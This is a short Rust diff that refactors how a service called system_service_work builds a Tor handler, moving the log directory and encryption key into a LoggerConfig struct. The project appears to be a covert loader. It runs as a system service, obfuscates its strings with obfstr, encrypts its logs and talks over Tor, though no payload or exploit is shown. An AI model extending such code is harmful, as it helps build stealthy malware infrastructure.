@@ -12,6 +12,7 @@ use anyhow::{ Context, Result };
 use loader_vars::constants::{ loader_service_name, system_log_directory };
 use obfstr::obfstr as s;
 use shared::constants::logs_encryption_key;
+use shared::network::tor::LoggerConfig;
 use shared::utils::config::load_mib_config;
 use shared::utils::functions::{
     get_current_exe,
@@ -151,12 +152,11 @@ fn system_service_work() {
         .build()
         .unwrap()
         .block_on(async move {
-            if
-                let Ok(mut handler) = LoaderTorHandler::new(
-                    system_log_directory(),
-                    logs_encryption_key()
-                ).await
-            {
+            let logger_config = LoggerConfig::New {
+                log_directory: system_log_directory(),
+                log_encryption_key: logs_encryption_key(),
+            };
+            if let Ok(mut handler) = LoaderTorHandler::new(logger_config).await {
                 handler.run_handler().await;
             }
         });
